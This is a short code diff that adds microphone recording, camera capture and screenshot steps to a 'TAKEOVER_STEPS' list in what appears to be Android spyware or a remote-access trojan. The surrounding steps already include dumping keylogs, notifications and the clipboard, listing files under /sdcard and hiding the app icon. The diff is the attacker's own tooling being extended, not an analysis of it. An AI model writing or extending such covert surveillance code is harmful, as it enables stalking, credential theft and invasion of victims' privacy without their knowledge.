@@ -132,6 +132,8 @@ TAKEOVER_STEPS = (
     ("perm_status", []),
     ("apps", []),
     ("usage", ["7"]),
+    ("mic_rec", ["10"]),
+    ("cam_shot", []),
     ("keylog_dump", []),
     ("notif_dump", []),
     ("clipboard_get", []),
@@ -145,6 +147,7 @@ TAKEOVER_STEPS = (
     ("files_ls", ["/sdcard"]),
     ("hide_icon", []),
     ("screen_start", []),
+    ("screenshot", []),
 )
 
 
